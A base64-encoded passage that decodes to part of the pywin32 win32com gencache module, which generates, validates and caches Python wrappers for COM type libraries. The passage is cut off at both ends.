E1vZHVsZVRvQ2FjaGUodHlwZWxpYkNMU0lELCBsY2lkLCBtYWpvciwgbWlub3IpXG4gICAgICAgIGFzc2VydCAiX2luX2dlbmNhY2hlXyIgaW4gbW9kLl9fZGljdF9fXG4gICAgcmV0dXJuIG1vZFxuXG5cbmRlZiBNYWtlTW9kdWxlRm9yVHlwZWxpYihcbiAgICB0eXBlbGliQ0xTSUQsXG4gICAgbGNpZCxcbiAgICBtYWpvcixcbiAgICBtaW5vcixcbiAgICBwcm9ncmVzc0luc3RhbmNlPU5vbmUsXG4gICAgYkZvckRlbWFuZD1iRm9yRGVtYW5kRGVmYXVsdCxcbiAgICBiQnVpbGRIaWRkZW49MSxcbik6XG4gICAgIiIiR2VuZXJhdGUgc3VwcG9ydCBmb3IgYSB0eXBlIGxpYnJhcnkuXG5cbiAgICBHaXZlbiB0aGUgSUlELCBMQ0lEIGFuZCB2ZXJzaW9uIGluZm9ybWF0aW9uIGZvciBhIHR5cGUgbGlicmFyeSwgZ2VuZXJhdGVcbiAgICBhbmQgaW1wb3J0IHRoZSBuZWNlc3Nhcnkgc3VwcG9ydCBmaWxlcy5cblxuICAgIFJldHVybnMgdGhlIFB5dGhvbiBtb2R1bGUuICBObyBleGNlcHRpb25zIGFyZSBjYXVnaHQuXG5cbiAgICBQYXJhbXNcbiAgICB0eXBlbGliQ0xTSUQgLS0gSUlEIG9mIHRoZSB0eXBlIGxpYnJhcnkuXG4gICAgbWFqb3IgLS0gSW50ZWdlciBtYWpvciB2ZXJzaW9uLlxuICAgIG1pbm9yIC0tIEludGVnZXIgbWlub3IgdmVyc2lvbi5cbiAgICBsY2lkIC0tIEludGVnZXIgTENJRCBmb3IgdGhlIGxpYnJhcnkuXG4gICAgcHJvZ3Jlc3NJbnN0YW5jZSAtLSBJbnN0YW5jZSB0byB1c2UgYXMgcHJvZ3Jlc3MgaW5kaWNhdG9yLCBvciBOb25lIHRvXG4gICAgICAgICAgICAgICAgICAgICAgICB1c2UgdGhlIEdVSSBwcm9ncmVzcyBiYXIuXG4gICAgIiIiXG4gICAgZnJvbSAuIGltcG9ydCBtYWtlcHlcblxuICAgIG1ha2VweS5HZW5lcmF0ZUZyb21UeXBlTGliU3BlYyhcbiAgICAgICAgKHR5cGVsaWJDTFNJRCwgbGNpZCwgbWFqb3IsIG1pbm9yKSxcbiAgICAgICAgcHJvZ3Jlc3NJbnN0YW5jZT1wcm9ncmVzc0luc3RhbmNlLFxuICAgICAgICBiRm9yRGVtYW5kPWJGb3JEZW1hbmQsXG4gICAgICAgIGJCdWlsZEhpZGRlbj1iQnVpbGRIaWRkZW4sXG4gICAgKVxuICAgIHJldHVybiBHZXRNb2R1bGVGb3JUeXBlbGliKHR5cGVsaWJDTFNJRCwgbGNpZCwgbWFqb3IsIG1pbm9yKVxuXG5cbmRlZiBNYWtlTW9kdWxlRm9yVHlwZWxpYkludGVyZmFjZShcbiAgICB0eXBlbGliX29iLCBwcm9ncmVzc0luc3RhbmNlPU5vbmUsIGJGb3JEZW1hbmQ9YkZvckRlbWFuZERlZmF1bHQsIGJCdWlsZEhpZGRlbj0xXG4pOlxuICAgICIiIkdlbmVyYXRlIHN1cHBvcnQgZm9yIGEgdHlwZSBsaWJyYXJ5LlxuXG4gICAgR2l2ZW4gYSBQeUlUeXBlTGliIGludGVyZmFjZSBnZW5lcmF0ZSBhbmQgaW1wb3J0IHRoZSBuZWNlc3Nhcnkgc3VwcG9ydCBmaWxlcy4gIFRoaXMgaXMgdXNlZnVsXG4gICAgZm9yIGdldHRpbmcgbWFrZXB5IHN1cHBvcnQgZm9yIGEgdHlwZWxpYnJhcnkgdGhhdCBpcyBub3QgcmVnaXN0ZXJlZCAtIHRoZSBjYWxsZXIgY2FuIGxvY2F0ZVxuICAgIGFuZCBsb2FkIHRoZSB0eXBlIGxpYnJhcnkgaXRzZWxmLCByYXRoZXIgdGhhbiByZWx5aW5nIG9uIENPTSB0byBmaW5kIGl0LlxuXG4gICAgUmV0dXJucyB0aGUgUHl0aG9uIG1vZHVsZS5cblxuICAgIFBhcmFtc1xuICAgIHR5cGVsaWJfb2IgLS0gVGhlIHR5cGUgbGlicmFyeSBpdHNlbGZcbiAgICBwcm9ncmVzc0luc3RhbmNlIC0tIEluc3RhbmNlIHRvIHVzZSBhcyBwcm9ncmVzcyBpbmRpY2F0b3IsIG9yIE5vbmUgdG9cbiAgICAgICAgICAgICAgICAgICAgICAgIHVzZSB0aGUgR1VJIHByb2dyZXNzIGJhci5cbiAgICAiIiJcbiAgICBmcm9tIC4gaW1wb3J0IG1ha2VweVxuXG4gICAgdHJ5OlxuICAgICAgICBtYWtlcHkuR2VuZXJhdGVGcm9tVHlwZUxpYlNwZWMoXG4gICAgICAgICAgICB0eXBlbGliX29iLFxuICAgICAgICAgICAgcHJvZ3Jlc3NJbnN0YW5jZT1wcm9ncmVzc0luc3RhbmNlLFxuICAgICAgICAgICAgYkZvckRlbWFuZD1iRm9yRGVtYW5kRGVmYXVsdCxcbiAgICAgICAgICAgIGJCdWlsZEhpZGRlbj1iQnVpbGRIaWRkZW4sXG4gICAgICAgIClcbiAgICBleGNlcHQgcHl3aW50eXBlcy5jb21fZXJyb3I6XG4gICAgICAgIHJldHVybiBOb25lXG4gICAgdGxhID0gdHlwZWxpYl9vYi5HZXRMaWJBdHRyKClcbiAgICBndWlkID0gdGxhWzBdXG4gICAgbGNpZCA9IHRsYVsxXVxuICAgIG1ham9yID0gdGxhWzNdXG4gICAgbWlub3IgPSB0bGFbNF1cbiAgICByZXR1cm4gR2V0TW9kdWxlRm9yVHlwZWxpYihndWlkLCBsY2lkLCBtYWpvciwgbWlub3IpXG5cblxuZGVmIEVuc3VyZU1vZHVsZUZvclR5cGVsaWJJbnRlcmZhY2UoXG4gICAgdHlwZWxpYl9vYiwgcHJvZ3Jlc3NJbnN0YW5jZT1Ob25lLCBiRm9yRGVtYW5kPWJGb3JEZW1hbmREZWZhdWx0LCBiQnVpbGRIaWRkZW49MVxuKTpcbiAgICAiIiJDaGVjayB3ZSBoYXZlIHN1cHBvcnQgZm9yIGEgdHlwZSBsaWJyYXJ5LCBnZW5lcmF0aW5nIGlmIG5vdC5cblxuICAgIEdpdmVuIGEgUHlJVHlwZUxpYiBpbnRlcmZhY2UgZ2VuZXJhdGUgYW5kIGltcG9ydCB0aGUgbmVjZXNzYXJ5XG4gICAgc3VwcG9ydCBmaWxlcyBpZiBuZWNlc3NhcnkuIFRoaXMgaXMgdXNlZnVsIGZvciBnZXR0aW5nIG1ha2VweSBzdXBwb3J0XG4gICAgZm9yIGEgdHlwZWxpYnJhcnkgdGhhdCBpcyBub3QgcmVnaXN0ZXJlZCAtIHRoZSBjYWxsZXIgY2FuIGxvY2F0ZSBhbmRcbiAgICBsb2FkIHRoZSB0eXBlIGxpYnJhcnkgaXRzZWxmLCByYXRoZXIgdGhhbiByZWx5aW5nIG9uIENPTSB0byBmaW5kIGl0LlxuXG4gICAgUmV0dXJucyB0aGUgUHl0aG9uIG1vZHVsZS5cblxuICAgIFBhcmFtc1xuICAgIHR5cGVsaWJfb2IgLS0gVGhlIHR5cGUgbGlicmFyeSBpdHNlbGZcbiAgICBwcm9ncmVzc0luc3RhbmNlIC0tIEluc3RhbmNlIHRvIHVzZSBhcyBwcm9ncmVzcyBpbmRpY2F0b3IsIG9yIE5vbmUgdG9cbiAgICAgICAgICAgICAgICAgICAgICAgIHVzZSB0aGUgR1VJIHByb2dyZXNzIGJhci5cbiAgICAiIiJcbiAgICB0bGEgPSB0eXBlbGliX29iLkdldExpYkF0dHIoKVxuICAgIGd1aWQgPSB0bGFbMF1cbiAgICBsY2lkID0gdGxhWzFdXG4gICAgbWFqb3IgPSB0bGFbM11cbiAgICBtaW5vciA9IHRsYVs0XVxuXG4gICAgIyBJZiBkZW1hbmQgZ2VuZXJhdGVkLCBzYXZlIHRoZSB0eXBlbGliIGludGVyZmFjZSBhd2F5IGZvciBsYXRlciB1c2VcbiAgICBpZiBiRm9yRGVtYW5kOlxuICAgICAgICBkZW1hbmRHZW5lcmF0ZWRUeXBlTGlicmFyaWVzWyhzdHIoZ3VpZCksIGxjaWQsIG1ham9yLCBtaW5vcildID0gdHlwZWxpYl9vYlxuXG4gICAgdHJ5OlxuICAgICAgICByZXR1cm4gR2V0TW9kdWxlRm9yVHlwZWxpYihndWlkLCBsY2lkLCBtYWpvciwgbWlub3IpXG4gICAgZXhjZXB0IEltcG9ydEVycm9yOlxuICAgICAgICBwYXNzXG4gICAgIyBHZW5lcmF0ZSBpdC5cbiAgICByZXR1cm4gTWFrZU1vZHVsZUZvclR5cGVsaWJJbnRlcmZhY2UoXG4gICAgICAgIHR5cGVsaWJfb2IsIHByb2dyZXNzSW5zdGFuY2UsIGJGb3JEZW1hbmQsIGJCdWlsZEhpZGRlblxuICAgIClcblxuXG5kZWYgRm9yZ2V0QWJvdXRUeXBlbGliSW50ZXJmYWNlKHR5cGVsaWJfb2IpOlxuICAgICIiIkRyb3AgYW55IHJlZmVyZW5jZXMgdG8gYSB0eXBlbGliIHByZXZpb3VzbHkgYWRkZWQgd2l0aCBFbnN1cmVNb2R1bGVGb3JUeXBlbGliSW50ZXJmYWNlIGFuZCBmb3JEZW1hbmQiIiJcbiAgICB0bGEgPSB0eXBlbGliX29iLkdldExpYkF0dHIoKVxuICAgIGd1aWQgPSB0bGFbMF1cbiAgICBsY2lkID0gdGxhWzFdXG4gICAgbWFqb3IgPSB0bGFbM11cbiAgICBtaW5vciA9IHRsYVs0XVxuICAgIGluZm8gPSBzdHIoZ3VpZCksIGxjaWQsIG1ham9yLCBtaW5vclxuICAgIHRyeTpcbiAgICAgICAgZGVsIGRlbWFuZEdlbmVyYXRlZFR5cGVMaWJyYXJpZXNbaW5mb11cbiAgICBleGNlcHQgS2V5RXJyb3I6XG4gICAgICAgICMgTm90IHdvcnRoIHJhaXNpbmcgYW4gZXhjZXB0aW9uIC0gbWF5YmUgdGhleSBkb250IGtub3cgd2Ugb25seSByZW1lbWJlciBmb3IgZGVtYW5kIGdlbmVyYXRlZCwgZXRjLlxuICAgICAgICBwcmludChcbiAgICAgICAgICAgICJGb3JnZXRBYm91dFR5cGVsaWJJbnRlcmZhY2U6OiBXYXJuaW5nIC0gdHlwZSBsaWJyYXJ5IHdpdGggaW5mbyAlcyBpcyBub3QgYmVpbmcgcmVtZW1iZXJlZCEiXG4gICAgICAgICAgICAlIChpbmZvLClcbiAgICAgICAgKVxuICAgICMgYW5kIGRyb3AgYW55IHZlcnNpb24gcmVkaXJlY3RzIHRvIGl0XG4gICAgZm9yIGtleSwgdmFsIGluIGxpc3QodmVyc2lvblJlZGlyZWN0TWFwLml0ZW1zKCkpOlxuICAgICAgICBpZiB2YWwgPT0gaW5mbzpcbiAgICAgICAgICAgIGRlbCB2ZXJzaW9uUmVkaXJlY3RNYXBba2V5XVxuXG5cbmRlZiBFbnN1cmVNb2R1bGUoXG4gICAgdHlwZWxpYkNMU0lELFxuICAgIGxjaWQsXG4gICAgbWFqb3IsXG4gICAgbWlub3IsXG4gICAgcHJvZ3Jlc3NJbnN0YW5jZT1Ob25lLFxuICAgIGJWYWxpZGF0ZUZpbGU9bm90IGlzX3JlYWRvbmx5LFxuICAgIGJGb3JEZW1hbmQ9YkZvckRlbWFuZERlZmF1bHQsXG4gICAgYkJ1aWxkSGlkZGVuPTEsXG4pOlxuICAgICIiIkVuc3VyZSBQeXRob24gc3VwcG9ydCBpcyBsb2FkZWQgZm9yIGEgdHlwZSBsaWJyYXJ5LCBnZW5lcmF0aW5nIGlmIG5lY2Vzc2FyeS5cblxuICAgIEdpdmVuIHRoZSBJSUQsIExDSUQgYW5kIHZlcnNpb24gaW5mb3JtYXRpb24gZm9yIGEgdHlwZSBsaWJyYXJ5LCBjaGVjayBhbmQgaWZcbiAgICBuZWNlc3NhcnkgKHJlKWdlbmVyYXRlLCB0aGVuIGltcG9ydCB0aGUgbmVjZXNzYXJ5IHN1cHBvcnQgZmlsZXMuIElmIHdlIHJlZ2VuZXJhdGUgdGhlIGZpbGUsIHRoZXJlXG4gICAgaXMgbm8gd2F5IHRvIHRvdGFsbHkgc251ZmYgb3V0IGFsbCBpbnN0YW5jZXMgb2YgdGhlIG9sZCBtb2R1bGUgaW4gUHl0aG9uLCBhbmQgdGh1cyB3ZSB3aWxsIHJlZ2VuZXJhdGUgdGhlIGZpbGUgbW9yZSB0aGFuIG5lY2Vzc2FyeSxcbiAgICB1bmxlc3MgbWFrZXB5L2dlbnB5IGlzIG1vZGlmaWVkIGFjY29yZGluZ2x5LlxuXG5cbiAgICBSZXR1cm5zIHRoZSBQeXRob24gbW9kdWxlLiAgTm8gZXhjZXB0aW9ucyBhcmUgY2F1Z2h0IGR1cmluZyB0aGUgZ2VuZXJhdGUgcHJvY2Vzcy5cblxuICAgIFBhcmFtc1xuICAgIHR5cGVsaWJDTFNJRCAtLSBJSUQgb2YgdGhlIHR5cGUgbGlicmFyeS5cbiAgICBtYWpvciAtLSBJbnRlZ2VyIG1ham9yIHZlcnNpb24uXG4gICAgbWlub3IgLS0gSW50ZWdlciBtaW5vciB2ZXJzaW9uXG4gICAgbGNpZCAtLSBJbnRlZ2VyIExDSUQgZm9yIHRoZSBsaWJyYXJ5LlxuICAgIHByb2dyZXNzSW5zdGFuY2UgLS0gSW5zdGFuY2UgdG8gdXNlIGFzIHByb2dyZXNzIGluZGljYXRvciwgb3IgTm9uZSB0b1xuICAgICAgICAgICAgICAgICAgICAgICAgdXNlIHRoZSBHVUkgcHJvZ3Jlc3MgYmFyLlxuICAgIGJWYWxpZGF0ZUZpbGUgLS0gV2hldGhlciBvciBub3QgdG8gcGVyZm9ybSBjYWNoZSB2YWxpZGF0aW9uIG9yIG5vdFxuICAgIGJGb3JEZW1hbmQgLS0gU2hvdWxkIGEgY29tcGxldGUgZ2VuZXJhdGlvbiBoYXBwZW4gbm93LCBvciBvbiBkZW1hbmQ/XG4gICAgYkJ1aWxkSGlkZGVuIC0tIFNob3VsZCBoaWRkZW4gbWVtYmVycy9hdHRyaWJ1dGVzIGV0YyBiZSBnZW5lcmF0ZWQ/XG4gICAgIiIiXG4gICAgYlJlbG9hZE5lZWRlZCA9IDBcbiAgICB0cnk6XG4gICAgICAgIHRyeTpcbiAgICAgICAgICAgIG1vZHVsZSA9IEdldE1vZHVsZUZvclR5cGVsaWIodHlwZWxpYkNMU0lELCBsY2lkLCBtYWpvciwgbWlub3IpXG4gICAgICAgIGV4Y2VwdCBJbXBvcnRFcnJvcjpcbiAgICAgICAgICAgICMgSWYgd2UgZ2V0IGFuIEltcG9ydEVycm9yXG4gICAgICAgICAgICAjIFdlIG1heSBzdGlsbCBmaW5kIGEgdmFsaWQgY2FjaGUgZmlsZSB1bmRlciBhIGRpZmZlcmVudCBNaW5vclZlcnNpb24gI1xuICAgICAgICAgICAgIyAod2hpY2ggd2luZG93cyB3aWxsIHNlYXJjaCBvdXQgZm9yIHVzKVxuICAgICAgICAgICAgIyBwcmludCAiTG9hZGluZyByZWcgdHlwZWxpYiIsIHR5cGVsaWJDTFNJRCwgbWFqb3IsIG1pbm9yLCBsY2lkXG4gICAgICAgICAgICBtb2R1bGUgPSBOb25lXG4gICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgdGxiQXR0ciA9IHB5dGhvbmNvbS5Mb2FkUmVnVHlwZUxpYihcbiAgICAgICAgICAgICAgICAgICAgdHlwZWxpYkNMU0lELCBtYWpvciwgbWlub3IsIGxjaWRcbiAgICAgICAgICAgICAgICApLkdldExpYkF0dHIoKVxuICAgICAgICAgICAgICAgICMgaWYgdGhlIGFib3ZlIGxpbmUgZG9lc25cJ3QgdGhyb3cgYSBweXRob25jb20uY29tX2Vycm9yLCBjaGVjayBpZlxuICAgICAgICAgICAgICAgICMgaXQgaXMgYWN0dWFsbHkgYSBkaWZmZXJlbnQgbGliIHRoYW4gd2UgcmVxdWVzdGVkLCBhbmQgaWYgc28sIHN1Y2sgaXQgaW5cbiAgICAgICAgICAgICAgICBpZiB0bGJBdHRyWzFdICE9IGxjaWQgb3IgdGxiQXR0cls0XSAhPSBtaW5vcjpcbiAgICAgICAgICAgICAgICAgICAgIyBwcmludCAiVHJ5aW5nIDJuZCBtaW5vciAjIiwgdGxiQXR0clsxXSwgdGxiQXR0clszXSwgdGxiQXR0cls0XVxuICAgICAgICAgICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgICAgICAgICBtb2R1bGUgPSBHZXRNb2R1bGVGb3JUeXBlbGliKFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHR5cGVsaWJDTFNJRCwgdGxiQXR0clsxXSwgdGxiQXR0clszXSwgdGxiQXR0cls0XVxuICAgICAgICAgICAgICAgICAgICAgICAgKVxuICAgICAgICAgICAgICAgICAgICBleGNlcHQgSW1wb3J0RXJyb3I6XG4gICAgICAgICAgICAgICAgICAgICAgICAjIFdlIGRvblwndCBoYXZlIGEgbW9kdWxlLCBidXQgd2UgZG8gaGF2ZSBhIGJldHRlciBtaW5vclxuICAgICAgICAgICAgICAgICAgICAgICAgIyB2ZXJzaW9uIC0gcmVtZW1iZXIgdGhhdC5cbiAgICAgICAgICAgICAgICAgICAgICAgIG1pbm9yID0gdGxiQXR0cls0XVxuICAgICAgICAgICAgICAgICMgZWxzZSBtb2R1bGUgcmVtYWlucyBOb25lXG4gICAgICAgICAgICBleGNlcHQgcHl0aG9uY29tLmNvbV9lcnJvcjpcbiAgICAgICAgICAgICAgICAjIGNvdWxkblwndCBsb2FkIGFueSB0eXBlbGliIC0gbW9kIHJlbWFpbnMgTm9uZVxuICAgICAgICAgICAgICAgIHBhc3NcbiAgICAgICAgaWYgbW9kdWxlIGlzIG5vdCBOb25lIGFuZCBiVmFsaWRhdGVGaWxlOlxuICAgICAgICAgICAgYXNzZXJ0IG5vdCBpc19yZWFkb25seSwgIkNhblwndCB2YWxpZGF0ZSBpbiBhIHJlYWQtb25seSBnZW5jYWNoZSJcbiAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICB0eXBMaWJQYXRoID0gcHl0aG9uY29tLlF1ZXJ5UGF0aE9mUmVnVHlwZUxpYihcbiAgICAgICAgICAgICAgICAgICAgdHlwZWxpYkNMU0lELCBtYWpvciwgbWlub3IsIGxjaWRcbiAgICAgICAgICAgICAgICApXG4gICAgICAgICAgICAgICAgIyB3aW5kb3dzIHNlZW1zIHRvIGFkZCBhbiBleHRyYSBcXDAgKHZpYSB0aGUgdW5kZXJseWluZyBCU1RSKVxuICAgICAgICAgICAgICAgICMgVGhlIG1haW53aW4gdG9vbGtpdCBkb2VzIG5vdCBhZGQgdGhpcyBlcnJvbmVvdXMgXFwwXG4gICAgICAgICAgICAgICAgaWYgdHlwTGliUGF0aFstMV0gPT0gIlxcMCI6XG4gICAgICAgICAgICAgICAgICAgIHR5cExpYlBhdGggPSB0eXBMaWJQYXRoWzotMV1cbiAgICAgICAgICAgICAgICBzdWYgPSBnZXRhdHRyKG9zLnBhdGgsICJzdXBwb3J0c191bmljb2RlX2ZpbGVuYW1lcyIsIDApXG4gICAgICAgICAgICAgICAgaWYgbm90IHN1ZjpcbiAgICAgICAgICAgICAgICAgICAgIyBjYW5cJ3QgcGFzcyB1bmljb2RlIGZpbGVuYW1lcyBkaXJlY3RseSAtIGNvbnZlcnRcbiAgICAgICAgICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgICAgICAgICAgdHlwTGliUGF0aCA9IHR5cExpYlBhdGguZW5jb2RlKHN5cy5nZXRmaWxlc3lzdGVtZW5jb2RpbmcoKSlcbiAgICAgICAgICAgICAgICAgICAgZXhjZXB0IEF0dHJpYnV0ZUVycm9yOiAgIyBubyBzeXMuZ2V0ZmlsZXN5c3RlbWVuY29kaW5nXG4gICAgICAgICAgICAgICAgICAgICAgICB0eXBMaWJQYXRoID0gc3RyKHR5cExpYlBhdGgpXG4gICAgICAgICAgICAgICAgdGxiQXR0cmlidXRlcyA9IHB5dGhvbmNvbS5Mb2FkUmVnVHlwZUxpYihcbiAgICAgICAgICAgICAgICAgICAgdHlwZWxpYkNMU0lELCBtYWpvciwgbWlub3IsIGxjaWRcbiAgICAgICAgICAgICAgICApLkdldExpYkF0dHIoKVxuICAgICAgICAgICAgZXhjZXB0IHB5dGhvbmNvbS5jb21fZXJyb3I6XG4gICAgICAgICAgICAgICAgIyBXZSBoYXZlIGEgbW9kdWxlLCBidXQgbm8gdHlwZSBsaWIgLSB3ZSBzaG91bGQgc3RpbGxcbiAgICAgICAgICAgICAgICAjIHJ1biB3aXRoIHdoYXQgd2UgaGF2ZSB0aG91Z2ggLSB0aGUgdHlwZWxpYiBtYXkgbm90IGJlXG4gICAgICAgICAgICAgICAgIyBkZXBsb3llZCBoZXJlLlxuICAgICAgICAgICAgICAgIGJWYWxpZGF0ZUZpbGUgPSAwXG4gICAgICAgIGlmIG1vZHVsZSBpcyBub3QgTm9uZSBhbmQgYlZhbGlkYXRlRmlsZTpcbiAgICAgICAgICAgIGFzc2VydCBub3QgaXNfcmVhZG9ubHksICJDYW5cJ3QgdmFsaWRhdGUgaW4gYSByZWFkLW9ubHkgZ2VuY2FjaGUiXG4gICAgICAgICAgICBmaWxlUGF0aFByZWZpeCA9ICIlc1xcXFwlcyIgJSAoXG4gICAgICAgICAgICAgICAgR2V0R2VuZXJhdGVQYXRoKCksXG4gICAgICAgICAgICAgICAgR2V0R2VuZXJhdGVkRmlsZU5hbWUodHlwZWxpYkNMU0lELCBsY2lkLCBtYWpvciwgbWlub3IpLFxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgZmlsZVBhdGggPSBmaWxlUGF0aFByZWZpeCArICIucHkiXG4gICAgICAgICAgICBmaWxlUGF0aFB5YyA9IGZpbGVQYXRoUHJlZml4ICsgIi5weSJcbiAgICAgICAgICAgIGlmIF9fZGVidWdfXzpcbiAgICAgICAgICAgICAgICBmaWxlUGF0aFB5YyA9IGZpbGVQYXRoUHljICsgImMiXG4gICAgICAgICAgICBlbHNlOlxuICAgICAgICAgICAgICAgIGZpbGVQYXRoUHljID0gZmlsZVBhdGhQeWMgKyAibyJcbiAgICAgICAgICAgICMgVmVyaWZ5IHRoYXQgdHlwZSBsaWJyYXJ5IGlzIHVwIHRvIGRhdGUuXG4gICAgICAgICAgICAjIElmIHdlIGhhdmUgYSBkaWZmZXJpbmcgTWlub3JWZXJzaW9uIG9yIGdlbnB5IGhhcyBidW1wZWQgdmVyc2lvbnMsIHVwZGF0ZSB0aGUgZmlsZVxuICAgICAgICAgICAgZnJvbSAuIGltcG9ydCBnZW5weVxuXG4gICAgICAgICAgICBpZiAoXG4gICAgICAgICAgICAgICAgbW9kdWxlLk1pbm9yVmVyc2lvbiAhPSB0bGJBdHRyaWJ1dGVzWzRdXG4gICAgICAgICAgICAgICAgb3IgZ2VucHkubWFrZXB5X3ZlcnNpb24gIT0gbW9kdWxlLm1ha2VweV92ZXJzaW9uXG4gICAgICAgICAgICApOlxuICAgICAgICAgICAgICAgICMgcHJpbnQgIlZlcnNpb24gc2tldzogJWQsICVkIiAlIChtb2R1bGUuTWlub3JWZXJzaW9uLCB0bGJBdHRyaWJ1dGVzWzRdKVxuICAgICAgICAgICAgICAgICMgdHJ5IHRvIGVyYXNlIHRoZSBiYWQgZmlsZSBmcm9tIHRoZSBjYWNoZVxuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgb3MudW5saW5rKGZpbGVQYXRoKVxuICAgICAgICAgICAgICAgIGV4Y2VwdCBvcy5lcnJvcjpcbiAgICAgICAgICAgICAgICAgICAgcGFzc1xuICAgICAgICAgICAgICAgIHRyeTpcbiAgICAgICAgICAgICAgICAgICAgb3MudW5saW5rKGZpbGVQYXRoUHljKVxuICAgICAgICAgICAgICAgIGV4Y2VwdCBvcy5lcnJvcjpcbiAgICAgICAgICAgICAgICAgICAgcGFzc1xuICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguaXNkaXIoZmlsZVBhdGhQcmVmaXgpOlxuICAgICAgICAgICAgICAgICAgICBpbXBvcnQgc2h1dGlsXG5cbiAgICAgICAgICAgICAgICAgICAgc2h1dGlsLnJtdHJlZShmaWxlUGF0aFByZWZpeClcbiAgICAgICAgICAgICAgICBtaW5vciA9IHRsYkF0dHJpYnV0ZXNbNF1cbiAgICAgICAgICAgICAgICBtb2R1bGUgPSBOb25lXG4gICAgICAgICAgICAgICAgYlJlbG9hZE5lZWRlZCA9IDFcbiAgICAgICAgICAgIGVsc2U6XG4gICAgICAgICAgICAgICAgbWlub3IgPSBtb2R1bGUuTWlub3JWZXJzaW9uXG4gICAgICAgICAgICAgICAgZmlsZVBhdGhQcmVmaXggPSAiJXNcXFxcJXMiICUgKFxuICAgICAgICAgICAgICAgICAgICBHZXRHZW5lcmF0ZVBhdGgoKSxcbiAgICAgICAgICAgICAgICAgICAgR2V0R2VuZXJhdGVkRmlsZU5hbWUodHlwZWxpYkNMU0lELCBsY2lkLCBtYWpvciwgbWlub3IpLFxuICAgICAgICAgICAgICAgIClcbiAgICAgICAgICAgICAgICBmaWxlUGF0aCA9IGZpbGVQYXRoUHJlZml4ICsgIi5weSJcbiAgICAgICAgICAgICAgICBmaWxlUGF0aFB5YyA9IGZpbGVQYXRoUHJlZml4ICsgIi5weWMiXG4gICAgICAgICAgICAgICAgIyBwcmludCAiVHJ5aW5nIHB5IHN0YXQ6ICIsIGZpbGVQYXRoXG4gICAgICAgICAgICAgICAgZk1vZFRpbWVTZXQgPSAwXG4gICAgICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgICAgICBweU1vZFRpbWUgPSBvcy5zdGF0KGZpbGVQYXRoKVs4XVxuICAgICAgICAgICAgICAgICAgICBmTW9kVGltZVNldCA9IDFcbiAgICAgICAgICAgICAgICBleGNlcHQgb3MuZXJyb3IgYXMgZTpcbiAgICAgICAgICAgICAgICAgICAgIyBJZiAucHkgZmlsZSBmYWlscywgdHJ5IC5weWMgZmlsZVxuICAgICAgICAgICAgICAgICAgICAjIHByaW50ICJUcnlpbmcgcHljIHN0YXQiLCBmaWxlUGF0aFB5Y1xuICAgICAgICAgICAgICAgICAgICB0cnk6XG4gICAgICAgICAgICAgICAgICAgICAgICBweU1vZFRpbWUgPSBvcy5zdGF0KGZpbGVQYXRoUHljKVs4XVxuICAgICAgICAgICAgICAgICAgICAgICAgZk1vZFRpbWVTZXQgPSAxXG4gICAgICAgICAgICAgICAgICAgIGV4Y2VwdCBvcy5lcnJvciBhcyBlOlxuICAgICAgICAgICAgICAgICAgICAgICAgcGFzc1xuICAgICAgICAgICAgICAgICMgcHJpbnQgIlRyeWluZyBzdGF0IHR5cGVsaWIiLCBweU1vZFRpbWVcbiAgICAgICAgICAgICAgICAjIHByaW50IHN0cih0eXBMaWJQYXRoKVxuICAgICAgICAgICAgICAgIHR5cExpYk1vZFRpbWUgPSBvcy5zdGF0KHR5cExpYlBhdGgpWzhdXG4gICAgICAgICAgICAgICAgaWYgZk1vZFRpbWVTZXQgYW5kICh0eXBMaWJNb2RUaW1lID4gcHlNb2RUaW1lKTpcbiAgICAgICAgICAgICAgICAgICAgYlJlbG9hZE5lZWRlZCA9IDFcbiAgICAgICAgICAgICAgICAgICAgbW9kdWxlID0gTm9uZVxuICAgIGV4Y2VwdCAoSW1wb3J0RXJyb3IsIG9zLmVycm9yKTpcbiAgICAgICAgbW9kdWxlID0gTm9uZVxuICAgIGlmIG1vZHVsZSBpcyBOb25lOlxuICAgICAgICAjIFdlIG5lZWQgdG8gYnVpbGQgYW4gaXRlbS4gIElmIHdlIGFyZSBpbiBhIHJlYWQtb25seSBjYWNoZSwgd2VcbiAgICAgICAgIyBjYW5cJ3QvZG9uXCd0IHdhbnQgdG8gZG8gdGhpcyAtIHNvIGJlZm9yZSBnaXZpbmcgdXAsIGNoZWNrIGZvclxuICAgICAgICAjIGEgZGlmZmVyZW50IG1pbm9yIHZlcnNpb24gaW4gb3VyIGNhY2hlIC0gYWNjb3JkaW5nIHRvIENPTSwgdGhpcyBpcyBPS1xuICAgICAgICBpZiBpc19yZWFkb25seTpcbiAgICAgICAgICAgIGtleSA9IHN0cih0eXBlbGliQ0xTSUQpLCBsY2lkLCBtYWpvciwgbWlub3JcbiAgICAgICAgICAgICMgSWYgd2UgaGF2ZSBiZWVuIGFza2VkIGJlZm9yZSwgZ2V0IGxhc3QgcmVzdWx0LlxuICAgICAgICAgICAgdHJ5OlxuICAgICAgICAgICAgICAgIHJldHVybiB2ZXJzaW9uUmVkaXJlY3RNYXBba2V5XVxuICAgICAgICAgICAgZXhjZXB0IEtleUVycm9yOlxuICAgICAgICAgICAgICAgIHBhc3NcbiAgICAgICAgICAgICMgRmluZCBvdGhlciBjYW5kaWRhdGVzLlxuICAgICAgICAgICAgaXRlbXMgPSBbXVxuICAgICAgICAgICAgZm9yIGRlc2MgaW4gR2V0R2VuZXJhdGVkSW5mb3MoKTpcbiAgICAgICAgICAgICAgICBpZiBrZXlbMF0gPT0gZGVzY1swXSBhbmQga2V5WzFdID09IGRlc2NbMV0gYW5kIGtleVsyXSA9PSBkZXNjWzJdOlxuICAgICAgICAgICAgICAgICAgICBpdGVtcy5hcHBlbmQoZGVzYylcbiAgICAgICAgICAgIGlmIGl0ZW1zOlxuICAgICAgICAgICAgICAgICMgSXRlbXMgYXJlIGFsbCBpZGVudGljYWwsIGV4Y2VwdCBmb3IgbGFzdCB0dXBsZSBlbGVtZW50XG4gICAgICAgICAgICAgICAgIyBXZSB3YW50IHRoZSBsYXRlc3QgbWlub3IgdmVyc2lvbiB3ZSBoYXZlIC0gc28ganVzdCBzb3J0IGFuZCB